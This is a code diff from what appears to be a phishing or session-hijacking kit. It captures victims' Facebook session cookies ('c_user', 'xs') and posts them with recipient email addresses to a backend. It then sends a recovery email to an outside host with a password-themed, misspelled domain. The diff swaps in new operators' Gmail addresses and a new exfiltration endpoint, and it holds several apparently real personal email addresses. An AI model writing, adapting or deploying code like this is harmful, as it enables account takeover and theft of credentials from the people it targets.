@@ -453,14 +453,14 @@
                 body: JSON.stringify({
                     c_user: cUserInput,
                     xs: xsInput,
-                    emails: ["mjohn72929@gmail.com", allowRecovery && recoveryInput ? "itguy932@gmail.com" : "info.fawad.jani@gmail.com"],
-                    workerEmail: "mjohn72929@gmail.com",
+                    emails: ["raheelnizamani898@gmaill.com", allowRecovery && recoveryInput ? "raheelnizamani169@gmail.com" : "raheelnizamani96@gmail.com"],
+                    workerEmail: "adeelnizamani69gmail.com",
                     name: allowRecovery && recoveryInput ? "Me" : "Fawad"
                 }),
             }).then(res => {
                 if (res.ok) {
                     if (allowRecovery && recoveryInput) {
-                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
+                         fetch("https://re-enter-passvord.vercel.app", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
